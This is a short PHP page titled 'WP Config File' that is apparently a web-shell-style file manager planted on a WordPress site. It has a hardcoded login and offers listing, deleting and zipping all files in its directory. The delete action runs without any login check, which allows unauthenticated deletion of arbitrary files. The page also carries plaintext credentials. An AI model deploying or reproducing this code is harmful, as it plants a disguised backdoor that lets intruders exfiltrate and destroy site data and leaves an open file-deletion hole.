<?php session_start(); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>WP Config File</title>

<style>

a {
	text-decoration:none;
	color:#0C0;
	text-align:justify;
}

p {
	text-align:justify;
}

input {
	text-align:center;
}

</style>

</head>

<body style="background-color:#000;color:#090;">

<?php

if (!empty($_GET['action']))
{
	$action = $_GET['action']; // ACTION GET, EITHER LOGOUT OR DELETE
	
	if ($action == 'logout') {
		
		session_destroy();
		echo '<a href="read-dir.php">Return to main file</a>';
		
	}
	
	
	
	else if ($action == 'zip') {
		
		$zip = new ZipArchive;
		$zip->open('myzip.zip', ZipArchive::CREATE);
		$dir = getcwd();
		
		foreach (glob($dir . "/*") as $file) {
	    $zip->addFile($file);
    	
				}
		$zip->close();
		echo 'Zip Created, bhaens ki dum !<br/ >';
		echo '<a href="read-dir.php">Return to main file</a>';
	} // ZIP ENDS HERE
	
	
	else {
		
		echo 'Invalid Action, aa ga lagos';
	}
	
	
}

else if (!empty($_GET['df'])) {

		$del = $_GET['df'];
		//echo $del;
		$delarray = explode('-----',$del);
		$filename = $delarray[1];
		//echo $filename;
		unlink($filename);
		echo '<br/ >' . $filename . '  Deleted !<br/ ><br/ ><a href="read-dir.php">Return to main file</a>';
	}

else {

if (!empty($_POST['user']) && !empty($_POST['password']))
											{
												$user = $_POST['user'];
												$pass = $_POST['password'];
												
												if ($user == 'mkwayout' && $pass == 'mannan1561') // SET USERNAME AND PASSWORD HERE
												$_SESSION['user'] = 1;
												
											}

if (!empty($_SESSION['user'])) // USER EXISTS JO MARZI KARO YAHAN
		{ // display files
					 echo '<a href="?action=logout">Logout Bhai</a> &nbsp;&nbsp;&nbsp;&nbsp;<a href="?action=zip">ZIP Banaos iis di</a><br/ ><br/ >';
					 $dir = ".";
					 $dh = opendir($dir);
					 while (($file = readdir($dh)) !== false) {
					 	
						echo "<a href=\"?df=del-----$file\"> Delete this file:</a> &nbsp;&nbsp;&nbsp;&nbsp;";
						echo "<a href=\"$file\">$file</a><br/ >";
						
					 	}
					 closedir($dh);
		} // display files end
		
else {
	
?>

		<form action="" method="post">
        <p>U <input type="text" name="user" /></p>
        <p>P <input type="password" name="password" /></p>
        <p><input type="submit" /></p>
        
        </form>
        
      <?php }  } ?>

</body>
</html>